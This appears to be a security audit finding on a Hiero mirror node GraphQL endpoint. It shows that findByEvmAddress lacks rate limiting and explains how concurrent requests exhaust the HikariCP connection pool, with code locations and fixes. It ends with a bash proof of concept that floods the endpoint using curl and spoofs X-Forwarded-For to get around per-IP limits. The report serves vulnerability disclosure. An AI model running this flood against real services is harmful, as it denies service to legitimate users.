### Title
GraphQL `findByEvmAddress` Endpoint Lacks Application-Level Rate Limiting, Enabling HikariCP Connection Pool Exhaustion

### Summary
The `EntityRepository.findByEvmAddress(byte[])` method executes a native SQL query against the database on every invocation with no caching and no application-level rate limiting in the GraphQL module. An unprivileged attacker using as few as two source IPs can sustain enough concurrent requests to fully occupy the HikariCP connection pool (default size: 10), starving legitimate users of database connections. The only protection — a Traefik `inFlightReq` middleware capping 5 concurrent requests per IP — is both insufficient and potentially disabled by default.

### Finding Description

**Exact code location:**
- `graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 16–17: `findByEvmAddress` is a `@Query(nativeQuery = true)` that issues `SELECT * FROM entity WHERE evm_address = ?1 AND deleted IS NOT TRUE` directly against the database on every call, with no result caching.
- `graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 28–89: The only protections configured are GraphQL parse limits (`maxCharacters`, `maxTokens`), query complexity (max 200), and query depth (max 10). There is no rate-limiting filter, no bucket4j throttle bean, and no per-client concurrency control anywhere in the `graphql/` module.
- `common/src/main/java/org/hiero/mirror/common/CommonConfiguration.java`, lines 60–64: HikariCP is configured via `spring.datasource.hikari` properties. No graphql-specific override exists (confirmed: no `hikari` configuration found under `graphql/src/main/resources/`), so the pool defaults to HikariCP's default `maximumPoolSize` of **10**.
- `charts/hedera-mirror-graphql/values.yaml`, lines 135–145: The Traefik middleware defines `inFlightReq: amount: 5` with `ipStrategy: depth: 1`. This is the sole rate-control mechanism.

**Root cause and failed assumption:**
The design assumes the Traefik ingress middleware is sufficient to prevent resource exhaustion. This assumption fails for three reasons:
1. `global.middleware: false` in `values.yaml` line 89 indicates the middleware is disabled by default in many deployments.
2. Even when enabled, 5 concurrent requests per IP × 2 attacker IPs = 10 simultaneous DB connections, which equals the full default HikariCP pool.
3. The `retry: attempts: 3` middleware (lines 143–145) causes Traefik to re-issue each failed request up to 3 additional times, amplifying attacker load by up to 3×.
4. The `ipStrategy: depth: 1` reads the IP from the X-Forwarded-For header at depth 1. If the attacker can inject or rotate X-Forwarded-For values (possible when Traefik is behind another proxy or when the header is not stripped), the per-IP limit is bypassed entirely.

**Exploit flow:**
1. Attacker sends 5 concurrent POST requests to `/graphql/alpha` from IP-A, each containing `{ account(input: { evmAddress: "0x<valid_20_bytes>" }) { balance } }`.
2. Each request triggers `findByEvmAddress`, acquiring a HikariCP connection for up to 10 seconds (`statementTimeout: 10000`).
3. Attacker simultaneously sends 5 more concurrent requests from IP-B (or with a spoofed X-Forwarded-For header).
4. All 10 HikariCP connections are now held by attacker requests.
5. Any legitimate GraphQL request that reaches `findByEvmAddress` (or any other DB-backed resolver) blocks waiting for a connection until `connectionTimeout` expires, returning an error to the legitimate user.

**Why existing checks fail:**
- `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` only reject structurally complex queries; a simple single-field `evmAddress` lookup has complexity 1 and depth 1 — well within limits.
- JSON/parse limits (`maxTokenCount: 100`, `maxCharacters: 10000`) do not throttle request rate.
- The `circuitBreaker` middleware only trips on aggregate error ratios, not on connection pool pressure.
- No equivalent of `web3`'s `ThrottleConfiguration` / `ThrottleManagerImpl` (bucket4j) exists in the `graphql` module.

### Impact Explanation
When the HikariCP pool is exhausted, all GraphQL resolvers that touch the database fail with a connection acquisition timeout for all users. This constitutes a complete denial of the GraphQL API's database-backed functionality. The impact is service unavailability (griefing) with no economic damage to the Hedera network itself, consistent with the Medium scope classification. The `statementTimeout` of 10 seconds means the attacker must sustain only ~1 request/second per connection slot to keep the pool permanently saturated.

### Likelihood Explanation
The attack requires no authentication, no special knowledge beyond the public GraphQL schema, and no more than two IP addresses (or one IP with X-Forwarded-For manipulation). The query payload is trivial (a single-field GraphQL query). The attacker needs no economic resources. The attack is fully repeatable and automatable with a simple script. The only barrier is whether the Traefik middleware is enabled; if `global.middleware: false` is the deployed default, there is zero infrastructure-level protection.

### Recommendation
1. **Add application-level rate limiting to the GraphQL module**: Implement a bucket4j-based `ThrottleFilter` (mirroring `web3`'s `ThrottleConfiguration`) that enforces a global requests-per-second cap and, optionally, a per-IP cap using `HttpServletRequest.getRemoteAddr()`.
2. **Add a query-result cache for `findByEvmAddress`**: Annotate the service method with `@Cacheable` (Caffeine) so repeated lookups for the same address do not consume a DB connection.
3. **Set an explicit HikariCP `maximumPoolSize`** in the GraphQL application configuration and ensure it is sized relative to the expected concurrency, not left at the default.
4. **Enable and harden the Traefik middleware**: Set `global.middleware: true` in production deployments and reduce `inFlightReq.amount` to a value that cannot saturate the pool even from a single IP (e.g., 2).
5. **Strip or validate X-Forwarded-For** at the ingress boundary to prevent IP spoofing of the `ipStrategy`.

### Proof of Concept
```bash
# Saturate pool from two IPs (or two terminal windows simulating two IPs)
# Terminal 1 (IP-A): hold 5 concurrent connections
for i in $(seq 1 5); do
  curl -s -X POST http://<graphql-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d '{"query":"{account(input:{evmAddress:\"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"}){balance}}"}' &
done

# Terminal 2 (IP-B or X-Forwarded-For spoofed): hold 5 more
for i in $(seq 1 5); do
  curl -s -X POST http://<graphql-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -H 'X-Forwarded-For: 10.0.0.2' \
    -d '{"query":"{account(input:{evmAddress:\"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"}){balance}}"}' &
done

# Legitimate user request — will time out or error due to pool exhaustion
curl -X POST http://<graphql-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{"query":"{account(input:{entityId:{shard:0,realm:0,num:2}}){balance}}"}'
# Expected: connection acquisition timeout / 500 error
```
